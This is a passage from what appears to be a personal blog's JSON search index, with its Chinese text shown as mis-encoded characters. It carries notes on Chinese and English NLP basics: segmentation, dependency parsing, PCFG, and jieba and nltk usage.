å‚è€ƒé“¾æ¥ï¼š Ubuntu18.04å®‰è£…ååº”è¯¥åšçš„äº‹ Linuxç©å®¶å¿…å¤‡ï¼šUbuntuå®Œå…¨é…ç½®æŒ‡å— Ubuntu 18.04é…ç½®åŠç¾åŒ–","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"Linux","slug":"Tools/Linux","permalink":"https://racleray.github.io/categories/Tools/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://racleray.github.io/tags/Linux/"}]},{"title":"ä¸­æ–‡æ–‡æœ¬å¤„ç†","slug":"ä¸­æ–‡æ–‡æœ¬å¤„ç†","date":"2020-07-06T13:40:16.000Z","updated":"2023-08-07T11:54:31.038Z","comments":true,"path":"posts/b75580e5.html","link":"","permalink":"https://racleray.github.io/posts/b75580e5.html","excerpt":"ç®€è¦è®°å½•ä¸€ç‚¹ä¸­æ–‡æ–‡æœ¬å¤„ç†çš„æ¦‚å¿µå’Œå·¥å…·ä½¿ç”¨ã€‚","text":"ä¸­æ–‡æ–‡æœ¬åŸºæœ¬ä»»åŠ¡ä¸å¤„ç† 1.åˆ†è¯ ä¸­æ–‡å’Œæ—¥æ–‡å•çº¯ä»æ–‡æœ¬å½¢æ€ä¸Šæ— æ³•åŒºåˆ†å…·å¤‡ç‹¬ç«‹å«ä¹‰çš„è¯ï¼ˆæ‹‰ä¸è¯­ç³»çº¯å¤©ç„¶ç”±ç©ºæ ¼åˆ†éš”ä¸åŒçš„wordï¼‰ã€‚å› æ­¤åœ¨å¾ˆå¤šä¸­æ–‡ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬éœ€è¦åšçš„ç¬¬ä¸€ä¸ªå¤„ç†å«åšåˆ†è¯ã€‚ â€‹ ä¸»æµçš„åˆ†è¯æ–¹æ³•ä¸»è¦æ˜¯åŸºäºè¯å…¸åŒ¹é…çš„åˆ†è¯æ–¹æ³•(æ­£å‘æœ€å¤§åŒ¹é…æ³•ã€é€†å‘æœ€å¤§åŒ¹é…æ³•å’ŒåŒå‘åŒ¹é…åˆ†è¯æ³•ç­‰)å’ŒåŸºäºç»Ÿè®¡çš„åˆ†è¯æ–¹æ³•(HMMã€CRFã€å’Œæ·±åº¦å­¦ä¹ )ï¼›â€˜ â€‹ ä¸»æµçš„åˆ†è¯å·¥å…·åº“åŒ…æ‹¬ ä¸­ç§‘é™¢è®¡ç®—æ‰€NLPIRã€å“ˆå·¥å¤§LTPã€æ¸…åå¤§å­¦THULACã€Hanlpåˆ†è¯å™¨ã€Python jiebaå·¥å…·åº“ç­‰ã€‚ æœ€å¤§åŒ¹é…æ³• â€‹ æœ€å¤§åŒ¹é…æ˜¯æŒ‡ä»¥è¯å…¸ä¸ºä¾æ®ï¼Œå–è¯å…¸ä¸­æœ€é•¿å•è¯ä¸ºç¬¬ä¸€ä¸ªæ¬¡å–å­—æ•°é‡çš„æ‰«æä¸²ï¼Œåœ¨è¯å…¸ä¸­è¿›è¡Œæ‰«æï¼ˆä¸ºæå‡æ‰«ææ•ˆç‡ï¼Œè¿˜å¯ä»¥è·Ÿæ®å­—æ•°å¤šå°‘è®¾è®¡å¤šä¸ªå­—å…¸ï¼Œç„¶åæ ¹æ®å­—æ•°åˆ†åˆ«ä»ä¸åŒå­—å…¸ä¸­è¿›è¡Œæ‰«æï¼‰ã€‚ â€‹ åŒå‘æœ€å¤§åŒ¹é…æ³•ï¼šæ­£å‘æœ€å¤§åŒ¹é…å’Œé€†å‘æœ€å¤§åŒ¹é…ä¸¤ç§ç®—æ³•éƒ½åˆ‡ä¸€éï¼Œç„¶åæ ¹æ®å¤§é¢—ç²’åº¦è¯è¶Šå¤šè¶Šå¥½ï¼Œéè¯å…¸è¯å’Œå•å­—è¯è¶Šå°‘è¶Šå¥½çš„åŸåˆ™ï¼Œé€‰å–å…¶ä¸­ä¸€ç§åˆ†è¯ç»“æœè¾“å‡ºã€‚ â€œæˆ‘ä»¬åœ¨é‡ç”ŸåŠ¨ç‰©å›­ç©â€ â€‹ - æ­£å‘æœ€å¤§åŒ¹é…æ³•ï¼šâ€œæˆ‘ä»¬/åœ¨é‡/ç”ŸåŠ¨/ç‰©/å›­/ç©â€ï¼Œå…¶ä¸­ï¼Œå•å­—å­—å…¸è¯ä¸º2ï¼Œéè¯å…¸è¯ä¸º1ã€‚ â€‹ - é€†å‘æœ€å¤§åŒ¹é…æ³•ï¼šâ€œæˆ‘ä»¬/åœ¨/é‡ç”ŸåŠ¨ç‰©å›­/ç©â€ï¼Œå…¶ä¸­ï¼Œå•å­—å­—å…¸è¯ä¸º2ï¼Œéè¯å…¸è¯ä¸º0ã€‚ â€‹ éå­—å…¸è¯ï¼šæ­£å‘(1)&gt;é€†å‘(0)ï¼ˆè¶Šå°‘è¶Šå¥½ï¼‰ â€‹ å•å­—å­—å…¸è¯ï¼šæ­£å‘(2)=é€†å‘(2)ï¼ˆè¶Šå°‘è¶Šå¥½ï¼‰ â€‹ æ€»è¯æ•°ï¼šæ­£å‘(6)&gt;é€†å‘(4)ï¼ˆè¶Šå°‘è¶Šå¥½ï¼‰ å› æ­¤æœ€ç»ˆè¾“å‡ºä¸ºé€†å‘ç»“æœã€‚ 2.å»åœç”¨è¯ä¸N-gram â€‹ åŒè‹±æ–‡ 3.è¯æ€§æ ‡æ³¨ â€‹ è¯æ€§æ ‡æ³¨ï¼ˆpart-of-speech taggingï¼‰,åˆç§°ä¸ºè¯ç±»æ ‡æ³¨æˆ–è€…ç®€ç§°æ ‡æ³¨ï¼Œæ˜¯æŒ‡ä¸ºåˆ†è¯ç»“æœä¸­çš„æ¯ä¸ªå•è¯æ ‡æ³¨ä¸€ä¸ªæ­£ç¡®çš„è¯æ€§ã€‚ â€‹ åœ¨æ±‰è¯­ä¸­ï¼Œè¯æ€§æ ‡æ³¨æ¯”è¾ƒç®€å•ï¼Œå› ä¸ºæ±‰è¯­è¯æ±‡è¯æ€§å¤šå˜çš„æƒ…å†µæ¯”è¾ƒå°‘è§ï¼Œå¤§å¤šè¯è¯­åªæœ‰ä¸€ä¸ªè¯æ€§ï¼Œæˆ–è€…å‡ºç°é¢‘æ¬¡æœ€é«˜çš„è¯æ€§è¿œè¿œé«˜äºç¬¬äºŒä½çš„è¯æ€§ã€‚ 4.å¥æ³•ä¾å­˜åˆ†æ â€‹ ä¾å­˜å¥æ³•åˆ†æ(Dependency Parsing, DP) è¯†åˆ«å¥å­ä¸­çš„â€œä¸»è°“å®¾â€ã€â€œå®šçŠ¶è¡¥â€è¿™äº›è¯­æ³•æˆåˆ†ï¼Œå¹¶åˆ†æå„æˆåˆ†ä¹‹é—´çš„å…³ç³»ã€‚ image â€‹ ä¾å­˜å¥æ³•åˆ†ææ ‡æ³¨å…³ç³»(å…±14ç§) åŠå«ä¹‰å¦‚ä¸‹(å“ˆå·¥å¤§å¼€æºåŒ…ä½¿ç”¨)ï¼š å…³ç³»ç±»å‹ Tag Description Example ä¸»è°“å…³ç³» SBV subject-verb æˆ‘é€å¥¹ä¸€æŸèŠ±(æˆ‘&lt;â€“é€) åŠ¨å®¾å…³ç³» VOB ç›´æ¥å®¾è¯­ï¼Œverb-object æˆ‘é€å¥¹ä¸€æŸèŠ±(é€â€“&gt; èŠ±) é—´å®¾å…³ç³» IOB é—´æ¥å®¾è¯­ï¼Œindirect-object æˆ‘é€å¥¹ä¸€æŸèŠ±(é€â€“&gt; å¥¹) å‰ç½®å®¾è¯­ FOB å‰ç½®å®¾è¯­ï¼Œfronting-object ä»–ä»€ä¹ˆä¹¦éƒ½è¯»(ä¹¦&lt;â€“è¯») å…¼è¯­ DBL double ä»–è¯·æˆ‘åƒé¥­(è¯·â€“&gt; æˆ‘) å®šä¸­å…³ç³» ATT attribute çº¢è‹¹æœ(çº¢&lt;â€“è‹¹æœ) çŠ¶ä¸­ç»“æ„ ADV adverbial éå¸¸ç¾ä¸½(éå¸¸&lt;â€“ç¾ä¸½) åŠ¨è¡¥ç»“æ„ CMP complement åšå®Œäº†ä½œä¸š(åšâ€“&gt; å®Œ) å¹¶åˆ—å…³ç³» COO coordinate å¤§å±±å’Œå¤§æµ·(å¤§å±±â€“&gt; å¤§æµ·) ä»‹å®¾å…³ç³» POB preposition-object åœ¨è´¸æ˜“åŒºå†…(åœ¨â€“&gt; å†…) å·¦é™„åŠ å…³ç³» LAD left adjunct å¤§å±±å’Œå¤§æµ·(å’Œ&lt;â€“å¤§æµ·) å³é™„åŠ å…³ç³» RAD right adjunct å­©å­ä»¬(å­©å­â€“&gt; ä»¬) ç‹¬ç«‹ç»“æ„ IS independent structure ä¸¤ä¸ªå•å¥åœ¨ç»“æ„ä¸Šå½¼æ­¤ç‹¬ç«‹ æ ¸å¿ƒå…³ç³» HED head æŒ‡æ•´ä¸ªå¥å­çš„æ ¸å¿ƒ 5.è¯­ä¹‰ä¾å­˜åˆ†æ â€‹ Semantic Dependency Parsing, SDPï¼Œåˆ†æå¥å­å„ä¸ªè¯­è¨€å•ä½é—´çš„è¯­ä¹‰å…³è”ã€‚ â€‹ ä½¿ç”¨è¯­ä¹‰ä¾å­˜åˆ»ç”»å¥å­è¯­ä¹‰ï¼Œå¥½å¤„åœ¨äºä¸éœ€è¦å»æŠ½è±¡è¯æ±‡æœ¬èº«ï¼Œè€Œæ˜¯é€šè¿‡è¯æ±‡æ‰€æ‰¿å—çš„è¯­ä¹‰æ¡†æ¶æ¥æè¿°è¯¥è¯æ±‡ã€‚ â€‹ è¯­ä¹‰ä¾å­˜åˆ†æç›®æ ‡æ˜¯è·¨è¶Šå¥å­è¡¨å±‚å¥æ³•ç»“æ„çš„æŸç¼šï¼Œç›´æ¥è·å–æ·±å±‚çš„è¯­ä¹‰ä¿¡æ¯ã€‚ â€‹ ä¾‹å¦‚ä»¥ä¸‹ä¸‰ä¸ªå¥å­ï¼Œç”¨ä¸åŒçš„è¡¨è¾¾æ–¹å¼è¡¨è¾¾äº†åŒä¸€ä¸ªè¯­ä¹‰ä¿¡æ¯ï¼Œå³å¼ ä¸‰å®æ–½äº†ä¸€ä¸ªåƒçš„åŠ¨ä½œï¼Œåƒçš„åŠ¨ä½œæ˜¯å¯¹è‹¹æœå®æ–½çš„ã€‚ image â€‹ è¯­ä¹‰ä¾å­˜åˆ†æä¸å—å¥æ³•ç»“æ„çš„å½±å“ï¼Œå°†å…·æœ‰ç›´æ¥è¯­ä¹‰å…³è”çš„è¯­è¨€å•å…ƒç›´æ¥è¿æ¥ä¾å­˜å¼§å¹¶æ ‡è®°ä¸Šç›¸åº”çš„è¯­ä¹‰å…³ç³»ã€‚ â€‹ è¯­ä¹‰ä¾å­˜å…³ç³»åˆ†ä¸ºä¸‰ç±»ï¼Œåˆ†åˆ«æ˜¯ ä¸»è¦è¯­ä¹‰è§’è‰²ï¼Œæ¯ä¸€ç§è¯­ä¹‰è§’è‰²å¯¹åº”å­˜åœ¨ä¸€ä¸ªåµŒå¥—å…³ç³»å’Œåå…³ç³»ï¼› äº‹ä»¶å…³ç³»ï¼Œæè¿°ä¸¤ä¸ªäº‹ä»¶é—´çš„å…³ç³»ï¼› è¯­ä¹‰ä¾é™„æ ‡è®°ï¼Œæ ‡è®°è¯´è¯è€…è¯­æ°”ç­‰ä¾é™„æ€§ä¿¡æ¯ã€‚ â€‹ http://ltp.ai/demo.htmlï¼Œhttp://ltp.ai/docs/index.htmlï¼šå“ˆå·¥å¤§å¼€æºåŒ…ç½‘ç«™ 6.è¯­æ³•è§£æ â€‹ å¥å­å¯ä»¥ç”¨ä¸»è¯­ã€è°“è¯­ã€å®¾è¯­æ¥è¡¨ç¤ºã€‚åœ¨è‡ªç„¶è¯­è¨€çš„å¤„ç†è¿‡ç¨‹ä¸­ï¼Œæœ‰è®¸å¤šåº”ç”¨åœºæ™¯éƒ½éœ€è¦è€ƒè™‘å¥å­çš„è¯­æ³•ï¼Œå› æ­¤ç ”ç©¶è¯­æ³•è§£æå˜å¾—éå¸¸é‡è¦ã€‚ â€‹ è¯­æ³•è§£ææœ‰ä¸¤ä¸ªä¸»è¦çš„é—®é¢˜ï¼Œå…¶ä¸€æ˜¯å¥å­è¯­æ³•åœ¨è®¡ç®—æœºä¸­çš„è¡¨è¾¾ä¸å­˜å‚¨æ–¹æ³•ï¼Œä»¥åŠè¯­æ–™æ•°æ®é›†ï¼›å…¶äºŒæ˜¯è¯­æ³•è§£æçš„ç®—æ³•ã€‚ è¡¨è¾¾ä¸å­˜å‚¨ â€‹ ç”¨æ ‘çŠ¶ç»“æ„å›¾æ¥è¡¨ç¤º image â€‹ NPã€VPã€PPæ˜¯åè¯ã€åŠ¨è¯ã€ä»‹è¯çŸ­è¯­ï¼ˆçŸ­è¯­çº§åˆ«ï¼‰ï¼›Nã€Vã€Påˆ†åˆ«æ˜¯åè¯ã€åŠ¨è¯ã€ä»‹è¯ã€‚ è¯­æ³•è§£æçš„ç®—æ³• ä¸Šä¸‹æ–‡æ— å…³è¯­æ³•ï¼ˆContext-Free Grammerï¼‰ â€‹ ä¸ºäº†ç”Ÿæˆå¥å­çš„è¯­æ³•æ ‘ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰å¦‚ä¸‹çš„ä¸€å¥—ä¸Šä¸‹æ–‡æ— å…³è¯­æ³•ã€‚ â€¢1ï¼‰Nè¡¨ç¤ºä¸€ç»„éå¶å­èŠ‚ç‚¹çš„æ ‡æ³¨ï¼Œä¾‹å¦‚{Sã€NPã€VPã€N...} â€¢2ï¼‰Î£è¡¨ç¤ºä¸€ç»„å¶å­ç»“ç‚¹çš„æ ‡æ³¨ï¼Œä¾‹å¦‚{æˆ‘ä»¬ã€å°Šæ•¬...} â€¢3ï¼‰Rè¡¨ç¤ºä¸€ç»„è§„åˆ™ï¼Œæ¯æ¡è§„åˆ™å¯ä»¥è¡¨ç¤ºä¸º â€¢4ï¼‰Sè¡¨ç¤ºè¯­æ³•æ ‘å¼€å§‹çš„æ ‡æ³¨ â€‹ å½“ç»™å®šä¸€ä¸ªå¥å­æ—¶ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥æŒ‰ç…§ä»å·¦åˆ°å³çš„é¡ºåºæ¥è§£æè¯­æ³•ã€‚ â€‹ ä¾‹å¦‚ï¼Œå¥å­the man sleepså°±å¯ä»¥è¡¨ç¤ºä¸º(S (NP (DT the) (NN man)) (VP sleeps))ã€‚ â€‹ è§„åˆ™Rç¤ºä¾‹å¦‚ä¸‹ï¼š S -&gt; NP VP VP -&gt; V NP | V NP PP PP -&gt; P NP V -&gt; \"saw\" | \"ate\" NP -&gt; \"John\" | \"Mary\" | \"Bob\" | Det N | Det N PP Det -&gt; \"a\" | \"an\" | \"the\" | \"my\" N -&gt; \"dog\" | \"cat\" | \"cookie\" | \"park\" P -&gt; \"in\" | \"on\" | \"by\" | \"with\" æ¦‚ç‡åˆ†å¸ƒçš„ä¸Šä¸‹æ–‡æ— å…³è¯­æ³•ï¼ˆProbabilistic Context-Free Grammarï¼‰ â€‹ ä¸Šä¸‹æ–‡æ— å…³çš„è¯­æ³•å¯ä»¥å¾ˆå®¹æ˜“çš„æ¨å¯¼å‡ºä¸€ä¸ªå¥å­çš„è¯­æ³•ç»“æ„ï¼Œä½†æ˜¯ç¼ºç‚¹æ˜¯æ¨å¯¼å‡ºçš„ç»“æ„å¯èƒ½å­˜åœ¨äºŒä¹‰æ€§ã€‚ â€‹ ç”±äºè¯­æ³•çš„è§£æå­˜åœ¨äºŒä¹‰æ€§ï¼Œæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•ä»å¤šç§å¯èƒ½çš„è¯­æ³•æ ‘ç§æ‰¾å‡ºæœ€å¯èƒ½çš„ä¸€æ£µæ ‘ã€‚ â€‹ ä¸€ç§å¸¸è§çš„æ–¹æ³•æ—¢æ˜¯PCFG ï¼ˆProbabilistic Context-Free Grammarï¼‰ã€‚é™¤äº†å¸¸è§„çš„è¯­æ³•è§„åˆ™ä»¥å¤–ï¼Œæˆ‘ä»¬è¿˜å¯¹æ¯ä¸€æ¡è§„åˆ™èµ‹äºˆäº†ä¸€ä¸ªæ¦‚ç‡ã€‚å¯¹äºæ¯ä¸€æ£µç”Ÿæˆçš„è¯­æ³•æ ‘ï¼Œæˆ‘ä»¬å°†å…¶ä¸­æ‰€æœ‰è§„åˆ™çš„æ¦‚ç‡çš„ä¹˜ç§¯ä½œä¸ºè¯­æ³•æ ‘çš„å‡ºç°æ¦‚ç‡ã€‚ â€‹ åˆ†åˆ«è®¡ç®—æ¯é¢—è¯­æ³•æ ‘çš„æ¦‚ç‡p(t)ï¼Œå‡ºç°æ¦‚ç‡æœ€å¤§çš„é‚£é¢—è¯­æ³•æ ‘å°±æ˜¯æˆ‘ä»¬å¸Œæœ›å¾—åˆ°çš„ç»“æœï¼Œå³argmax p(t)ã€‚ â€‹ è®­ç»ƒç®—æ³•ï¼š ç®—æ³•ä¾èµ–äºCFGä¸­å¯¹äºNã€Î£ã€Rã€Sçš„å®šä¹‰ä»¥åŠPCFGä¸­çš„p(x)ã€‚ ç»Ÿè®¡å‡ºè¯­æ–™åº“ä¸­æ‰€æœ‰çš„Nå’ŒÎ£ åˆ©ç”¨è¯­æ–™åº“ä¸­çš„æ‰€æœ‰è§„åˆ™ä½œä¸ºR é’ˆå¯¹æ¯ä¸ªè§„åˆ™A -&gt; Bï¼Œä»è¯­æ–™åº“ä¸­ä¼°ç®—p(x) = p(A -&gt; B) / p(A) â€‹ åœ¨CFGçš„å®šä¹‰çš„åŸºç¡€ä¸Šï¼Œé‡æ–°å®šä¹‰ä¸€ç§å«Chomskyçš„è¯­æ³•æ ¼å¼ã€‚è¿™ç§æ ¼å¼è¦æ±‚æ¯æ¡è§„åˆ™åªèƒ½æ˜¯X -&gt; Y1 Y2æˆ–è€…X -&gt; Yçš„æ ¼å¼ã€‚å®é™…ä¸ŠChomskyè¯­æ³•æ ¼å¼ä¿è¯ç”Ÿäº§çš„è¯­æ³•æ ‘æ€»æ˜¯äºŒå‰æ ‘çš„æ ¼å¼ï¼ŒåŒæ—¶ä»»æ„ä¸€æ£µè¯­æ³•æ ‘æ€»æ˜¯èƒ½å¤Ÿè½¬åŒ–æˆChomskyè¯­æ³•æ ¼å¼ã€‚ â€‹ è¯­æ³•æ ‘é¢„æµ‹ç®—æ³•ï¼š è¾“å…¥ä¸€ä¸ªå¥å­x1, x2, ... , xnæ—¶ï¼Œè®¡ç®—å¥å­å¯¹åº”çš„è¯­æ³•æ ‘æœ‰ä¸¤ç§æ–¹æ³•ï¼š ç¬¬ä¸€ç§æ–¹æ³•æ˜¯æš´åŠ›éå†çš„æ–¹æ³•ï¼Œæ¯ä¸ªå•è¯xå¯èƒ½æœ‰m = len(N)ç§å–å€¼ï¼Œå¥å­é•¿åº¦æ˜¯nï¼Œæ¯ç§æƒ…å†µè‡³å°‘å­˜åœ¨nä¸ªè§„åˆ™ï¼Œæ‰€ä»¥åœ¨æ—¶é—´å¤æ‚åº¦\\(O(mn^2)\\)çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¤æ–­å‡ºæ‰€æœ‰å¯èƒ½çš„è¯­æ³•æ ‘å¹¶è®¡ç®—å‡ºæœ€ä½³çš„é‚£ä¸ªã€‚ ç¬¬äºŒç§æ–¹æ³•å½“ç„¶æ˜¯åŠ¨æ€è§„åˆ’ï¼Œæˆ‘ä»¬å®šä¹‰w[i, j, X]æ˜¯ç¬¬iä¸ªå•è¯è‡³ç¬¬jä¸ªå•è¯ç”±æ ‡æ³¨Xæ¥è¡¨ç¤ºçš„æœ€å¤§æ¦‚ç‡ã€‚w[i, j, PP]ä»£è¡¨çš„æ˜¯ç»§ç»­å¾€ä¸Šä¸€å±‚é€’å½’æ—¶ï¼Œåªé€‰æ‹©å½“å‰æ¦‚ç‡æœ€å¤§çš„ç»„åˆæ–¹å¼ã€‚ â€‹ ç¼ºç‚¹ï¼š â€‹ PCFGä¹Ÿæœ‰ä¸€äº›ç¼ºç‚¹ï¼Œä¾‹å¦‚ï¼š1ï¼‰ç¼ºä¹è¯æ³•ä¿¡æ¯ï¼›2ï¼‰è¿ç»­çŸ­è¯­ï¼ˆå¦‚åè¯ã€ä»‹è¯ï¼‰çš„å¤„ç†ç­‰ã€‚ä½†æ€»ä½“æ¥è®²å®ƒç»™è¯­æ³•è§£ææä¾›äº†ä¸€ç§éå¸¸æœ‰æ•ˆçš„å®ç°æ–¹æ³•ã€‚ 7.å‘½åå®ä½“è¯†åˆ« â€‹ ä»ä¸€æ®µéç»“æ„åŒ–æ–‡æœ¬ä¸­æ‰¾å‡ºç›¸å…³å®ä½“ï¼ˆtripletä¸­çš„ä¸»è¯å’Œå®¾è¯ï¼‰ï¼Œå¹¶æ ‡æ³¨å‡ºå…¶ä½ç½®ä»¥åŠç±»å‹ï¼Œå®ƒæ˜¯NLPé¢†åŸŸä¸­ä¸€äº›å¤æ‚ä»»åŠ¡ï¼ˆå¦‚å…³ç³»æŠ½å–ã€ä¿¡æ¯æ£€ç´¢ã€çŸ¥è¯†é—®ç­”ã€çŸ¥è¯†å›¾è°±ç­‰ï¼‰çš„åŸºç¡€ã€‚ å…³é”®è¯æŠ½å– â€‹ æ–‡æœ¬å…³é”®è¯æŠ½å–ï¼Œæ˜¯å¯¹æ–‡æœ¬ä¿¡æ¯è¿›è¡Œé«˜åº¦å‡ç»ƒçš„ä¸€ç§æœ‰æ•ˆæ‰‹æ®µï¼Œé€šè¿‡3-5ä¸ªè¯è¯­å‡†ç¡®æ¦‚æ‹¬æ–‡æœ¬çš„ä¸»é¢˜ï¼Œå¸®åŠ©è¯»è€…å¿«é€Ÿç†è§£æ–‡æœ¬ä¿¡æ¯ã€‚æ˜¯æ–‡æœ¬æ£€ç´¢ã€æ–‡æœ¬æ‘˜è¦ç­‰è®¸å¤šä¸‹æ¸¸æ–‡æœ¬æŒ–æ˜ä»»åŠ¡çš„åŸºç¡€æ€§å’Œå¿…è¦æ€§çš„å·¥ä½œã€‚ jieba åŸºæœ¬åˆ†è¯å‡½æ•°ä¸ç”¨æ³• â€‹ jieba.cut ä»¥åŠ jieba.cut_for_search è¿”å›çš„ç»“æ„éƒ½æ˜¯ä¸€ä¸ªå¯è¿­ä»£çš„ generatorã€‚ â€‹ jieba.lcutä»¥åŠjieba.lcut_for_searchç›´æ¥è¿”å› list æ·»åŠ ç”¨æˆ·è‡ªå®šä¹‰å­—å…¸ 1.å¯ä»¥ç”¨jieba.load_userdict(file_name)åŠ è½½ç”¨æˆ·å­—å…¸ 2.å°‘é‡çš„è¯æ±‡å¯ä»¥è‡ªå·±ç”¨ä¸‹é¢æ–¹æ³•æ‰‹åŠ¨æ·»åŠ ï¼š ç”¨ add_word(word, freq=None, tag=None) å’Œ del_word(word) åœ¨ç¨‹åºä¸­åŠ¨æ€ä¿®æ”¹è¯å…¸ç”¨ suggest_freq(segment, tune=True) å¯è°ƒèŠ‚å•ä¸ªè¯è¯­çš„è¯é¢‘ï¼Œä½¿å…¶èƒ½ï¼ˆæˆ–ä¸èƒ½ï¼‰è¢«åˆ†å‡ºæ¥ã€‚ è¯æ€§æ ‡æ³¨ 123import jieba.posseg as pseg # .possegæ¨¡å—words = pseg.cut() å…³é”®è¯æŠ½å– åŸºäº TF-IDF ç®—æ³•çš„å…³é”®è¯æŠ½å– import jieba.analyse jieba.analyse.extract_tags(sentence, topK=20, withWeight=False, allowPOS=()) sentence ä¸ºå¾…æå–çš„æ–‡æœ¬ topK ä¸ºè¿”å›å‡ ä¸ª TF/IDF æƒé‡æœ€å¤§çš„å…³é”®è¯ï¼Œé»˜è®¤å€¼ä¸º 20 withWeight ä¸ºæ˜¯å¦ä¸€å¹¶è¿”å›å…³é”®è¯æƒé‡å€¼ï¼Œé»˜è®¤å€¼ä¸º False allowPOS ä»…åŒ…æ‹¬æŒ‡å®šè¯æ€§çš„è¯ï¼Œé»˜è®¤å€¼ä¸ºç©ºï¼Œå³ä¸ç­›é€‰ è‡ªå®šä¹‰é€†å‘æ–‡ä»¶é¢‘ç‡ï¼ˆIDFï¼‰æ–‡æœ¬è¯­æ–™åº“ ç”¨æ³•ï¼š jieba.analyse.set_idf_path(file_name) # file_nameä¸ºè‡ªå®šä¹‰è¯­æ–™åº“çš„è·¯å¾„ è‡ªå®šä¹‰è¯­æ–™åº“ç¤ºä¾‹è§è¿™é‡Œ ç”¨æ³•ç¤ºä¾‹è§è¿™é‡Œ è‡ªå®šä¹‰åœæ­¢è¯ï¼ˆStop Wordsï¼‰æ–‡æœ¬è¯­æ–™åº“ ç”¨æ³•ï¼š jieba.analyse.set_stop_words(file_name) # file_nameä¸ºè‡ªå®šä¹‰è¯­æ–™åº“çš„è·¯å¾„ è‡ªå®šä¹‰è¯­æ–™åº“ç¤ºä¾‹è§è¿™é‡Œ ç”¨æ³•ç¤ºä¾‹è§è¿™é‡Œ å…³é”®è¯ä¸€å¹¶è¿”å›å…³é”®è¯æƒé‡å€¼ç¤ºä¾‹ ç”¨æ³•ç¤ºä¾‹è§è¿™é‡Œ åŸºäº TextRank ç®—æ³•çš„å…³é”®è¯æŠ½å– jieba.analyse.textrank(sentence, topK=20, withWeight=False, allowPOS=('ns', 'n', 'vn', 'v')) ç›´æ¥ä½¿ç”¨ï¼Œæ¥å£ç›¸åŒï¼Œæ³¨æ„é»˜è®¤è¿‡æ»¤è¯æ€§ã€‚ jieba.analyse.TextRank() æ–°å»ºè‡ªå®šä¹‰ TextRank å®ä¾‹ ç®—æ³•è®ºæ–‡ï¼š TextRank: Bringing Order into Texts åŸºæœ¬æ€æƒ³: å°†å¾…æŠ½å–å…³é”®è¯çš„æ–‡æœ¬è¿›è¡Œåˆ†è¯ ä»¥å›ºå®šçª—å£å¤§å°(é»˜è®¤ä¸º5ï¼Œé€šè¿‡spanå±æ€§è°ƒæ•´)ï¼Œè¯ä¹‹é—´çš„å…±ç°å…³ç³»ï¼Œæ„å»ºå›¾ è®¡ç®—å›¾ä¸­èŠ‚ç‚¹çš„PageRankï¼Œæ³¨æ„æ˜¯æ— å‘å¸¦æƒå›¾ è¯¦è§£è§textrank 123import jieba.analyse as analyseanalyse.textrank(lines, topK=20, withWeight=False, allowPOS=('ns', 'n')) ç¤ºä¾‹ 1234567891011import jieba.analyse as analyseimport pandas as pddf = pd.read_csv(\"./data/file.csv\", encoding='utf-8')df = df.dropna()lines=df.content.values.tolist()content = \"\".join(lines) # ä¸€è¡Œè¾“å…¥print(analyse.textrank(content, topK=20, withWeight=False, allowPOS=('ns', 'n', 'vn', 'v')))print(\"-------------------------------------\")print(analyse.textrank(content, topK=20, withWeight=False, allowPOS=('ns', 'n')))","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"chinese process","slug":"chinese-process","permalink":"https://racleray.github.io/tags/chinese-process/"},{"name":"basic","slug":"basic","permalink":"https://racleray.github.io/tags/basic/"}]},{"title":"è‹±æ–‡æ–‡æœ¬å¤„ç†","slug":"è‹±æ–‡æ–‡æœ¬å¤„ç†","date":"2020-07-06T13:12:08.000Z","updated":"2023-08-07T11:54:31.048Z","comments":true,"path":"posts/80c1e4ba.html","link":"","permalink":"https://racleray.github.io/posts/80c1e4ba.html","excerpt":"è®°å½•è‹±æ–‡æ–‡æœ¬å¤„ç†çš„å¸¸è§æ¦‚å¿µï¼Œä»¥åŠnltkä¸SpaCyçš„ç®€å•äº†è§£ã€‚","text":"è‹±æ–‡æ–‡æœ¬å¤„ç† â€‹ ç»“åˆnltkåŒ…è¿›è¡Œè¯´æ˜ã€‚ 1 Tokenization(æ ‡è®°åŒ–/åˆ†è¯) â€‹ æ–‡æœ¬æ˜¯ä¸èƒ½æˆæ®µé€å…¥æ¨¡å‹ä¸­è¿›è¡Œåˆ†æçš„ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šæŠŠæ–‡æœ¬åˆ‡æˆæœ‰ç‹¬ç«‹å«ä¹‰çš„å­—ã€è¯æˆ–è€…çŸ­è¯­ï¼Œè¿™ä¸ªè¿‡ç¨‹å«åštokenizationï¼Œè¿™é€šå¸¸æ˜¯å¤§å®¶è§£å†³è‡ªç„¶è¯­è¨€å¤„ç†é—®é¢˜çš„ç¬¬ä¸€æ­¥ã€‚ â€‹ NLTKä¸­æä¾›äº†2ç§ä¸åŒæ–¹å¼çš„tokenizationï¼š sentence tokenization å’Œ word tokenizationï¼Œå‰è€…æŠŠæ–‡æœ¬è¿›è¡Œâ€œæ–­å¥â€ï¼Œåè€…å¯¹æ–‡æœ¬è¿›è¡Œâ€œåˆ†è¯â€ã€‚ â€‹ sentence tokenizationç›¸æ¯”äºsplitçš„ä¼˜åŠ¿åœ¨äºï¼Œæ˜¯åˆ«ä¸æ˜¯å¥å·çš„ä½ç½®ï¼Œå¦‚ï¼šMr.H 1from nltk import word_tokenize, sent_tokenize 2 å»åœç”¨è¯ â€‹ åœ¨è‡ªç„¶è¯­è¨€å¤„ç†çš„ä¸€äº›ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å¤„ç†çš„ä¸»ä½“â€œæ–‡æœ¬â€ä¸­æœ‰ä¸€äº›åŠŸèƒ½è¯ç»å¸¸å‡ºç°ï¼Œç„¶è€Œå¯¹äºæœ€åçš„ä»»åŠ¡ç›®æ ‡å¹¶æ²¡æœ‰å¸®åŠ©ï¼Œç”šè‡³ä¼šå¯¹ç»“æœäº§ç”Ÿå¹²æ‰°ï¼Œæˆ‘ä»¬æŠŠè¿™ç±»è¯å«åšåœç”¨è¯ã€‚ 